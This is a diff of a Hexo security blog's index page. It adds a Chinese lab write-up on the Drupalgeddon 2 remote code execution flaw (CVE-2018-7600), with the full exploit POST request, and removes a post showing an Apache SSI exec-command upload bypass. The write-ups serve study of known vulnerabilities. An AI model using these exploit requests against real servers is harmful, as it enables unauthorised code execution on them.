@@ -229,6 +229,127 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/ld (12)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/27/ld (12)/" itemprop="url">Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T09:16:18+08:00">
+                2019-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Drupal-Drupalgeddon-2远程执行代码漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2远程执行代码漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）</h1><p>漏洞原理<br>Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞<br>&emsp;<br>7.58之前的Drupal，8.3.9之前的8.x，8.4.6之前的8.4.x和8.5.1之前的8.5.x允许远程攻击者执行任意代码，因为影响具有默认或通用模块配置的多个子系统的问题包括表单API。<br>&emsp;<br>环境启动后，访问<a href="http://your-ip:8080/，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。因为没有mysql环境，所以在安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。" target="_blank" rel="noopener">http://your-ip:8080/，您将看到drupal安装页面。使用“标准”配置文件完成drupal安装。因为没有mysql环境，所以在安装时应该选择sqlite数据库。安装完成后，您就可以开始利用它了。</a><br>&emsp;<br>打开bp拦截  然后发送到重发器<br><a href="https://imgchr.com/i/mEkQvn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEkQvn.png" alt="mEkQvn.png"></a><br>参考a2u / CVE-2018-7600，我们可以向drupal发送以下请求<br>修改http请求<br>&emsp;<br>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 103<br>&emsp;<br>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id<br>emsp;<br>成功执行代码后，执行id命令：<br><a href="https://imgchr.com/i/mEkwvR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEkwvR.png" alt="mEkwvR.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (10)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1336,127 +1457,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (5)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld (5)/" itemprop="url">Apache SSI 远程命令执行漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>漏洞原理<br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id" -->语法执行任意命令。<br>&amp;emsp；<br>先创建一个php文件<br><a href="https://imgchr.com/i/mAP3LT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAP3LT.png" alt="mAP3LT.png"></a><br>然后打开靶机上传文件<br><a href="https://imgchr.com/i/mAPJwF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPJwF.png" alt="mAPJwF.png"></a><br>然后发现不可以<br>正常上传PHP文件是不允许的，我们可以上传一个.shtml文件：<br><a href="https://imgchr.com/i/mAPaWR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPaWR.png" alt="mAPaWR.png"></a><br>然后通过bp拦截 把ss.php 后缀改成ss.shtml  go一下<br><a href="https://imgchr.com/i/mAPseO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPseO.png" alt="mAPseO.png"></a><br>然后访问靶机ip/8080/ss.shtml 就可以解析成功<br><a href="https://imgchr.com/i/mAPgFH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPgFH.png" alt="mAPgFH.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1507,7 +1507,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1520,7 +1520,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
